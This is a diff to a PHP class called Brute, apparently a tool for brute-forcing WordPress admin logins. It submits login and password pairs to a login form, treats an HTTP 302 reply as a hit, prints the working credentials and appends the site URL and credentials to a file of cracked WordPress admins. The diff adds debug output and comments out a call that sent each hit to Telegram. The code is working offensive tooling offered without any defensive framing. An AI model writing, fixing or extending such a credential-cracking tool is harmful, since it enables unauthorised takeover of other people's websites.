@@ -28,7 +28,7 @@ class Brute
         $this->login     = null;
         $this->password  = null;
 
-        $this->iteration = true;
+        $this->iteration = (bool)true;
     }
 
     public function __invoke($data)
@@ -40,7 +40,13 @@ class Brute
         $this->passwordCheck($data);
         $this->checkIterator($data);
 
-        if ($this->iteration === true) {
+//        print_r([
+//            'url'       => $this->url,
+//            'login'     => $this->login,
+//            'password'  => $this->password,
+//            'iteration' =>$this->iteration
+//        ]);die;
+
             $body = new FormBody;
             $body->addField('log', $this->login);
             $body->addField('pwd', $this->password);
@@ -50,15 +56,21 @@ class Brute
             $request->setBody($body);
 
             $response = yield $this->client->request($request);
+            $originalResponse = $response->getOriginalResponse();
 
-            if ($response->getStatus() == 302) {
+            print_r([
+                'login' => $this->login,
+                '$this->password' => $this->password,
+                'status' => $originalResponse->getStatus(),
+            ]);
+
+            if ($originalResponse->getStatus() === 302) {
                 echo $this->login . ":" . $this->password . PHP_EOL;
                 $wp_admin = $this->url . ";" . $this->login . ";" . $this->password;
-                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL);
+                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
 
-                (new Telegram())->sendMessage($wp_admin);
+//                (new Telegram())->sendMessage($wp_admin);
             }
-        }
     }
 
     public function checkIterator($data) {
